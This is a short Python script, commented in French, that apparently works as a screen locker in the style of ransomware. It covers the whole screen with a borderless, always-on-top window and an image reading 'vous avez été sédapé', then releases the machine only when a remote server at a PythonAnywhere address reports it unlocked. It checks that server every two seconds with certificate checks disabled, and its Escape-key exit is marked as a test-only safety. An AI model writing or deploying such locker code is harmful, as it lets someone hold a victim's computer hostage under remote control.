#!/usr/bin/env python3
import urllib.request, json, ssl, tkinter as tk
from PIL import Image, ImageTk

API_URL = "https://nary14.pythonanywhere.com"
HOSTNAME = "pc_sedape" 

class SedapeLock:
    def __init__(self, root):
        self.root = root
        self.root.overrideredirect(True)
        self.root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
        self.root.attributes('-topmost', True)
        self.root.bind("<Escape>", lambda e: self.quit_lock()) # SECURITÉ TEST
        
        try:
            img = Image.open("vous avez été sédapé.jpg").resize((root.winfo_screenwidth(), root.winfo_screenheight()))
            self.photo = ImageTk.PhotoImage(img)
            tk.Label(root, image=self.photo).pack()
        except: pass

        self.check_remote_unlock()

    def check_remote_unlock(self):
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(f"{API_URL}/status/{HOSTNAME}", context=ctx, timeout=5) as r:
                data = json.loads(r.read().decode())
                print(f"DEBUG: Status reçu pour {HOSTNAME} -> {data['unlocked']}")
                if data['unlocked']:
                    self.quit_lock()
                    return
        except Exception as e:
            print(f"ERREUR RESEAU: {e}")
        
        self.root.after(2000, self.check_remote_unlock)

    def quit_lock(self):
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    SedapeLock(root)
    root.mainloop()
